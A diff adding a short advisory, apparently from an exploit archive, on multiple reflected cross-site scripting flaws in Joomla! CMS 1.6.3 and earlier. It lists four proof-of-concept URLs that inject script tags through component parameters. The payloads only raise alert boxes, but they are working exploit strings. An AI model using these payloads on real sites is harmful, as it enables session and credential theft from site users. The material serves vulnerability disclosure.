@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/48471/info
+
+Joomla! CMS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Joomla! CMS versions 1.6.3 and prior are vulnerable. 
+
+http://www.example.com/joomla163_noseo/index.php?option=com_contact&view=category&catid=26&id=36&Itemid=-1";><script>alert(/XSS/)</script>
+http://www.example.com/joomla163_noseo/index.php?option=com_content&view=category&id=19&Itemid=260&limit=10&filter_order_Dir=&limitstart=&filter_order=><script>alert(/XSS/)</script>
+http://www.example.com/joomla163_noseo/index.php?option=com_newsfeeds&view=category&id=17&whateverehere=";><script>alert(/XSS/)</script>&Itemid=253&limit=10&filter_order_Dir=ASC&filter_order=ordering
+http://www.example.com/joomla163_noseo/index.php?option=";><script>alert(/XSS/)</script>&task=reset.request 
